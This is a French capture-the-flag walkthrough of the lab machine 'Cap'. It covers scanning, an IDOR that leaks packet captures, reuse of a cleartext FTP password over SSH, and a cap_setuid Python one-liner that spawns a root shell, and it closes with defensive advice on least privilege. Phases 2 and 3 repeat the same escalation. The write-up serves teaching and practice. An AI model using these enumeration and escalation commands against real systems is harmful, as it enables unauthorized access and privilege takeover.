![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

#### Énumération des Services
Je débute par un scan **Nmap** complet pour identifier les ports ouverts et les services associés. La machine présente une surface d'attaque standard pour un environnement Linux.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.245

# Scan de version et scripts par défaut sur les ports identifiés
nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.245
```

Le scan révèle trois services actifs :
*   **Port 21 (FTP)** : vsFTPd 3.0.3.
*   **Port 22 (SSH)** : OpenSSH 8.2p1 (Ubuntu).
*   **Port 80 (HTTP)** : Serveur web utilisant **gunicorn** (Python).

#### Énumération Web & Découverte d'IDOR
En naviguant sur le port 80, je découvre un dashboard de sécurité nommé "Cap". L'interface permet de visualiser des statistiques réseau et propose une fonctionnalité de **Security Snapshot** via le endpoint `/capture`.

J'observe que lorsqu'une capture est générée, le site redirige vers une URL de type `/data/7`. En testant la navigation vers d'autres indices (ex: `/data/1`, `/data/2`), je confirme la présence d'une vulnérabilité **Insecure Direct Object Reference (IDOR)**. Le serveur ne vérifie pas les autorisations d'accès aux objets (fichiers PCAP) basés sur l'identifiant numérique fourni dans l'URL.

> **Schéma Mental : Exploitation de l'IDOR**
> 1. **Action** : Le serveur génère des fichiers **PCAP** de manière séquentielle.
> 2. **Vecteur** : L'identifiant dans l'URL est prédictible et non protégé.
> 3. **Objectif** : Itérer sur les identifiants inférieurs (historiques) pour récupérer des captures de trafic appartenant à d'autres sessions ou à l'administrateur.

#### Extraction de Données (PCAP Analysis)
Je décide d'automatiser la récupération des fichiers **PCAP** disponibles pour analyser le trafic historique de la machine.

```bash
# Boucle de récupération des PCAPs via l'IDOR
for i in {0..10}; do wget http://10.10.10.245/download/$i -O $i.pcap; done
```

L'analyse du fichier `0.pcap` avec **Wireshark** (ou via `tcpdump`) est fructueuse. Je filtre le trafic pour isoler les sessions **FTP**. Je découvre une tentative de connexion en clair où l'utilisateur **nathan** s'authentifie avec le mot de passe `Buck3tH4TF0RM3!`.

```bash
# Extraction rapide des credentials via tshark
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

#### Premier Shell : SSH Access
Le service **SSH** étant ouvert, je tente une réutilisation de credentials (**Password Reuse**). Les identifiants extraits du trafic réseau s'avèrent valides pour un accès distant.

```bash
ssh nathan@10.10.10.245
# Password: Buck3tH4TF0RM3!
```

Je parviens à obtenir un **Interactive Shell** en tant que **nathan**. Le fichier `user.txt` est présent dans le répertoire personnel de l'utilisateur.

```bash
id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
ls -l /home/nathan/user.txt
```

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois les identifiants de **nathan** (`Buck3tH4TF0RM3!`) extraits du fichier **0.pcap** via l'exploitation de l'**IDOR**, j'établis un accès persistant via **SSH**.

```bash
# Connexion SSH avec les credentials interceptés
sshpass -p 'Buck3tH4TF0RM3!' ssh nathan@10.10.10.245
```

#### 1. Énumération Post-Exploitation

Je commence par inspecter l'environnement local. Le répertoire personnel de l'utilisateur ne contient aucun vecteur évident, je me tourne donc vers l'analyse de l'application **Flask** qui tourne sur le port 80, située dans `/var/www/html`.

En analysant `app.py`, je remarque un comportement critique dans la fonction `capture()` :

```python
@app.route("/capture")
def capture():
    os.setuid(0) # Passage temporaire en root
    # ... exécution de tcpdump ...
    os.setuid(1000) # Retour à l'utilisateur nathan
```

L'utilisation de `os.setuid(0)` indique que l'interpréteur **Python** possède des privilèges spéciaux, car un utilisateur standard ne peut normalement pas changer son **UID** vers celui de **root** (0).

> **Schéma Mental :**
> Analyse de privilèges : Processus Web (nathan) -> Appel à `setuid(0)` -> Succès ? -> Signifie que le binaire Python possède des **Linux Capabilities** ou un bit **SUID** mal configuré.

#### 2. Identification des Linux Capabilities

Pour confirmer cette hypothèse, j'utilise l'outil **getcap** sur le binaire **Python** utilisé par le système.

```bash
# Vérification des capabilities sur l'interpréteur Python
getcap /usr/bin/python3.8
```

**Résultat :**
`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`

L'attribut **cap_setuid** est extrêmement dangereux sur un interpréteur de script. Il permet à n'importe quel utilisateur capable d'exécuter ce binaire de manipuler les **UID** du processus et de s'octroyer les privilèges de n'importe quel utilisateur, y compris **root**.

#### 3. Escalade de Privilèges (Privilege Escalation)

Puisque **python3.8** possède la **capability** **cap_setuid**, je peux invoquer l'interpréteur en mode interactif et forcer l'**UID** à 0 avant de spawn un shell.

```python
# Exploitation de cap_setuid via l'interpréteur interactif
python3.8

>>> import os
>>> os.setuid(0) # Élévation immédiate au rang de super-utilisateur
>>> os.system("/bin/bash") # Spawn d'un shell root
```

> **Schéma Mental :**
> Binaire Python (Privilégié via cap_setuid) -> Injection de code Python -> `setuid(0)` -> Le noyau Linux autorise l'action car le binaire a le flag requis -> Le processus devient **Root** -> Exécution de `/bin/bash` héritant des privilèges.

#### 4. Collecte des Flags

Après l'escalade, je vérifie mon identité et récupère les preuves finales.

```bash
# Vérification de l'identité et lecture des flags
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)

cat /home/nathan/user.txt
cat /root/root.txt
```

**Note technique :** Bien que le **GID** (Group ID) reste celui de nathan, l'**UID** 0 est suffisant pour contourner toutes les restrictions du système de fichiers **Linux**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial obtenu en tant que **nathan**, mon objectif est d'identifier un vecteur permettant d'atteindre les privilèges **root**. L'énumération du système de fichiers et des processus révèle que le serveur fait tourner une application **Flask** (Gunicorn). L'analyse du code source de `app.py` montre une fonction `/capture` qui exécute `os.setuid(0)` pour lancer un **tcpdump**. Cette manipulation de l'**User ID** (UID) suggère que l'interpréteur **Python** possède des privilèges spécifiques.

#### Énumération des Linux Capabilities

Sur un système Linux moderne, les **Capabilities** permettent de diviser les privilèges du super-utilisateur en unités distinctes. Si un binaire possède la capacité **cap_setuid**, il peut changer son UID sans être lancé par **root**.

```bash
# Vérification des capabilities sur l'exécutable python
getcap /usr/bin/python3.8

# Output attendu :
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

> **Schéma Mental :**
> 1. **Besoin métier** : L'application web doit capturer des paquets réseau (**Raw Sockets**).
> 2. **Contrainte** : Seul **root** peut faire cela par défaut.
> 3. **Mauvaise solution** : Au lieu de lancer l'app en **root**, le développeur a assigné la **Capability** `cap_setuid` au binaire **Python**.
> 4. **Faille** : N'importe quel utilisateur pouvant exécuter **Python** peut désormais s'octroyer l'UID 0 (**root**).

#### Exploitation du vecteur cap_setuid

Puisque l'interpréteur **Python 3.8** possède la capacité **cap_setuid** dans son **Effective Set** (indiqué par le flag `+eip`), je peux simplement invoquer la bibliothèque `os` pour modifier l'identité du processus courant et spawner un shell privilégié.

```python
# Élévation de privilèges via l'interpréteur interactif
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Vérification de l'identité
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

Je suis désormais **root**. Le flag final se trouve dans `/root/root.txt`.

---

### Analyse Beyond Root

La compromission totale de **Cap** illustre parfaitement le danger des **Linux Capabilities** lorsqu'elles sont appliquées à des interpréteurs de scripts (Python, Perl, Ruby). 

1.  **Misconfiguration des Capabilities** : L'intention initiale était de permettre à l'application de lier des ports privilégiés (`cap_net_bind_service`) et de capturer du trafic. Cependant, accorder `cap_setuid` à un binaire aussi versatile que **Python** revient à donner un accès **Sudo NOPASSWD** complet. Un attaquant n'a pas besoin d'exploiter une vulnérabilité complexe ; il lui suffit d'utiliser les fonctions natives du langage.
2.  **Principe du Moindre Privilège** : Pour sécuriser cette machine, le développeur aurait dû utiliser des outils spécifiques comme **setcap** uniquement sur le binaire `tcpdump` lui-même, ou mieux, utiliser un **Group** dédié avec des permissions **Sudo** restreintes à une commande précise, plutôt que d'altérer les capacités globales de l'interpréteur système.
3.  **Persistance & Post-Exploitation** : En tant que **root**, l'analyse des fichiers cachés montre que `.bash_history` et `.viminfo` étaient liés à `/dev/null`. C'est une technique anti-forensics courante pour masquer les actions des administrateurs ou des attaquants précédents sur la machine.